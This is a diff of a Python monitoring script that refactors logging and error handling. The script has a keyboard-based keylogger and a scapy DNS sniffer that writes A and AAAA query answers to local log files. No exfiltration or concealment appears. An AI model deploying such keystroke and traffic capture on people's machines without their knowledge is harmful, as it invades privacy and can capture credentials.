@@ -1,4 +1,5 @@
-from utilities import current_time, user_name, log_console
+from utilities import current_time, user_name, active_interface
+from log_utils import log_console
 import logging
 import keyboard
 import scapy.all as scapy
@@ -7,11 +8,13 @@ import sys
 def setup_logger(log_filename, logger_name):
     logger = logging.getLogger(logger_name)
     logger.setLevel(logging.INFO)
+    # Remove all handlers if already set (avoid duplicate logs)
+    if logger.hasHandlers():
+        logger.handlers.clear()
     handler = logging.FileHandler(log_filename, mode='a')
     formatter = logging.Formatter('%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
     handler.setFormatter(formatter)
-    if not logger.hasHandlers():
-        logger.addHandler(handler)
+    logger.addHandler(handler)
     return logger
 
 def key_logger():
@@ -30,44 +33,53 @@ def key_logger():
     try:
         keyboard.wait()
     except KeyboardInterrupt:
-        print("Key Logger stopped by user.")
+        log_console("Key Logger stopped by user.", "INFO")
         sys.exit(0)
     except Exception as e:
-        print(f"Key Logger error: {e}")
+        log_console(f"Key Logger error: {e}", "ERROR")
         sys.exit(1)
 
 def dns_logger():
     """
     Starts the DNS logger and writes DNS queries to a uniquely named log file.
     """
-    print("DNS Query Logger started and running...\n")
+    log_console("DNS Query Logger started and running...", "INFO")
     log_filename = f"dnslog-{user_name()}_{current_time()}.txt"
     logger = setup_logger(log_filename, "DNSLogger")
 
     def process_packet(packet):
         if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
-            if packet[scapy.DNS].an is not None:
-                answers = packet[scapy.DNS].an
-                if not isinstance(answers, list) and not hasattr(answers, '__iter__'):
-                    answers = [answers]
-                for answer in answers:
-                    try:
-                        domain = answer.rrname.decode('utf-8')
-                        if answer.type == 1:  # A record
-                            ip = answer.rdata
-                            logger.info(f'A record: {domain} -> {ip}')
-                        elif answer.type == 28:  # AAAA record
-                            ip = answer.rdata
-                            logger.info(f'AAAA record: {domain} -> {ip}')
-                    except Exception as e:
-                        logger.error(f"Error processing DNS answer: {e}")
+            dns = packet[scapy.DNS]
+            ancount = dns.ancount
+            ans = dns.an
+            for _ in range(ancount):
+                if ans is None:
+                    break
+                try:
+                    domain = ans.rrname.decode('utf-8') if hasattr(ans.rrname, 'decode') else str(ans.rrname)
+                    if ans.type == 1:  # A record
+                        ip = ans.rdata
+                        logger.info(f'A record: {domain} -> {ip}')
+                    elif ans.type == 28:  # AAAA record
+                        ip = ans.rdata
+                        logger.info(f'AAAA record: {domain} -> {ip}')
+                except Exception as e:
+                    logger.error(f"Error processing DNS answer: {e}")
+                ans = getattr(ans, 'next', None)
 
     try:
         iface = active_interface()
+        if not iface:
+            log_console("Could not determine active network interface.", "ERROR")
+            sys.exit(1)
+        log_console(f"Listening on interface: {iface}", "INFO")
         scapy.sniff(iface=iface, store=False, prn=process_packet)
+    except PermissionError:
+        log_console("Permission denied: Run as administrator/root to sniff packets.", "ERROR")
+        sys.exit(1)
     except KeyboardInterrupt:
-        print("DNS Logger stopped by user.")
+        log_console("DNS Logger stopped by user.", "INFO")
         sys.exit(0)
     except Exception as e:
-        print(f"DNS Logger error: {e}")
+        log_console(f"DNS Logger error: {e}", "ERROR")
         sys.exit(1)
